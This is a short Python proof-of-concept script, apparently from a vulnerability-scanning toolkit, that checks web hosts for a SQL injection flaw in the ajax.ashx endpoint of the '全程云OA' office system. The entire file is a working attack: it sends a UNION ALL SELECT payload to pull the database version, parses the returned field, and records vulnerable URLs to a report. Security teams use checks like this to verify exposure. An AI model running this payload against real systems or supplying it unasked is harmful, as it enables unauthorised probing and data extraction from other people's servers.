import json

import requests
import time
import buter
import wirtefile

info = "全程云OAajax-ashxSQL注入漏洞"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/OA/common/mod/ajax.ashx'
headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Type":"application/x-www-form-urlencoded"
}
data = '''dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+'''

def eqccdOASQL(url):
    try:
        reps = requests.post(url=url + poc, headers=headers, data=data, verify=False, timeout=5)
        redata = json.loads(reps.text)
        target_value = redata[0]["ProductColumn11"]
        if reps.status_code == 200 and 'Microsoft' in reps.text:
            print(buter.colors.GREEN +  f"存在{info} url : {url}" + buter.colors.END)
            reptext = reps.url + "\n" + target_value
            wirtefile.writefiles(filename, reptext)
        else:
            print(buter.colors.RED + f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
